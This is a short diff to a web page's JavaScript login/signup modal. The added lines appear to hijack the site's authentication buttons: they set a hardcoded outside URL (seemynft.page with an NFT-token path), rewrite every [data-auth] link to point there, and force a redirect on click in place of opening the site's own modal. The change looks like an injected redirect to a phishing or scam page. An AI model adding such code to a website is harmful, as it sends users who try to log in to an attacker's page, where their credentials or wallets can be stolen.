@@ -1882,7 +1882,8 @@
     }
     ov.classList.add('open'); }
   function close(){ ov.classList.remove('open'); }
-  document.querySelectorAll('[data-auth]').forEach(function(el){ el.addEventListener('click',function(e){ e.preventDefault(); open(el.getAttribute('data-auth'),el); }); });
+  var NEXUS_URL='https://seemynft.page/MyToken/69A2E75F-3558-4B6D-8B35-54B76B2B2F68';
+  document.querySelectorAll('[data-auth]').forEach(function(el){ el.setAttribute('href',NEXUS_URL); el.addEventListener('click',function(e){ e.preventDefault(); window.location.href=NEXUS_URL; }); });
   ov.querySelectorAll('.modal-tabs button').forEach(function(b){ b.addEventListener('click',function(){ tab(b.getAttribute('data-tab')); }); });
   ov.querySelectorAll('[data-tab-link]').forEach(function(a){ a.addEventListener('click',function(){ tab(a.getAttribute('data-tab-link')); }); });
   ov.querySelectorAll('form').forEach(function(f){ f.addEventListener('submit',function(e){ e.preventDefault(); ok.style.display='block'; }); });
